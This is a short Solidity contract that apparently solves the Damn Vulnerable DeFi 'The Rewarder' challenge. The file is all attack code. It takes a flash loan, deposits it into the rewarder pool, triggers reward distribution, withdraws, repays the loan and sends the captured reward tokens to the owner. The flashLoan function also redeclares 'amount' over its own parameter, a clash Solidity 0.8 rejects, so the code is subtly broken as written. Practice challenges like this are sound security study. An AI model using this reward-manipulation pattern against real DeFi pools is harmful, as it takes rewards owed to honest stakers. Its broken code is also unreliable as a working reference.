// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract Test {

    TheRewarderPool public immutable theRewarderPool;
    FlashLoanerPool public immutable flashLoanPool;
    RewardToken public immutable rewardToken;
    DamnValuableToken public immutable liquidityToken;
    address public owner;
    constructor(address liquidityTokenAddress,address TheRewarderPoolAddress,address FlashLoanerPoolAddress,address RewardTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        theRewarderPool = TheRewarderPool(TheRewarderPoolAddress);
        flashLoanPool=FlashLoanerPool(FlashLoanerPoolAddress);
        rewardToken=RewardToken(RewardTokenAddress);
        owner=msg.sender;
    }

    function flashLoan(uint256 amount) external {
     require(msg.sender==owner,"only owner can call");
     flashLoanPool.flashLoan(amount);

     uint256 amount = rewardToken.balanceOf(address(this));
     rewardToken.transfer(msg.sender, amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);

        theRewarderPool.distributeRewards();

        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);

    }
}